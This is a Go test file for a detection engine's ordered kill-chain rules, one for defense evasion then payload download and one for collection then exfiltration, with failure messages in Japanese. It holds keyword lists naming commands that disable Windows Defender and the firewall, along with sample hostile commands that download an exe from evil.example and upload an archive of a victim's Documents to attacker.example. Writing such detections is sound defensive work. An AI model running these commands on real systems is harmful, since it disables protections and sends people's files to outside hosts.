package rules

import "testing"

// Guards the two new correlation kill-chains added in migration 290. Rule content
// lives in SQL; these tests pin the SUBSTRING tokens + ordering so a typo or a
// telemetry field drift that would make the chain inert fails loudly.

const defenseEvasionToPayloadContent = `
window: 10m
stages: 2
ordered: true
event_type: process
field: commandLine
stage_1: set-mppreference -disablerealtimemonitoring, sc stop windefend, netsh advfirewall set allprofiles state off
stage_2: certutil -urlcache, bitsadmin /transfer, invoke-webrequest, curl http
group_by: agent_id`

const collectionToExfilContent = `
window: 15m
stages: 2
ordered: true
event_type: process
field: commandLine
stage_1: compress-archive, 7z a, rar a, tar czf, zip -r
stage_2: curl -t, curl --upload-file, bitsadmin /upload, scp , (new-object net.webclient).uploadfile
group_by: agent_id`

func TestDefenseEvasionToPayload_Fires(t *testing.T) {
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{stagedRule("de", defenseEvasionToPayloadContent)})

	observeCmd(se, "agent-1", `powershell Set-MpPreference -DisableRealtimeMonitoring $true`)
	m := observeCmd(se, "agent-1", `certutil -urlcache -f http://evil.example/x.exe x.exe`)
	if len(m) == 0 {
		t.Fatal("防御回避→ペイロード取得の順序連鎖で発火しませんでした")
	}
}

func TestDefenseEvasionToPayload_WrongOrderNoFire(t *testing.T) {
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{stagedRule("de", defenseEvasionToPayloadContent)})

	// Download first, then disable — reverse order must not fire (ordered:true).
	observeCmd(se, "agent-1", `certutil -urlcache -f http://evil.example/x.exe x.exe`)
	m := observeCmd(se, "agent-1", `powershell Set-MpPreference -DisableRealtimeMonitoring $true`)
	if len(m) != 0 {
		t.Fatal("逆順(ダウンロード→無効化)では発火してはいけない")
	}
}

func TestCollectionToExfil_Fires(t *testing.T) {
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{stagedRule("ex", collectionToExfilContent)})

	observeCmd(se, "agent-1", `7z a -p secret.7z C:\Users\victim\Documents`)
	m := observeCmd(se, "agent-1", `curl --upload-file secret.7z http://attacker.example/drop`)
	if len(m) == 0 {
		t.Fatal("収集→持ち出しの順序連鎖で発火しませんでした")
	}
}

func TestCollectionToExfil_ArchiveOnlyNoFire(t *testing.T) {
	se := NewSequenceEngine()
	se.LoadRules([]*DetectionRule{stagedRule("ex", collectionToExfilContent)})

	// Archiving alone (a legit backup) must not fire without the upload stage.
	m := observeCmd(se, "agent-1", `Compress-Archive -Path C:\data -DestinationPath backup.zip`)
	if len(m) != 0 {
		t.Fatal("圧縮のみ(正規バックアップ)ではアップロード段なしで発火してはいけない")
	}
}
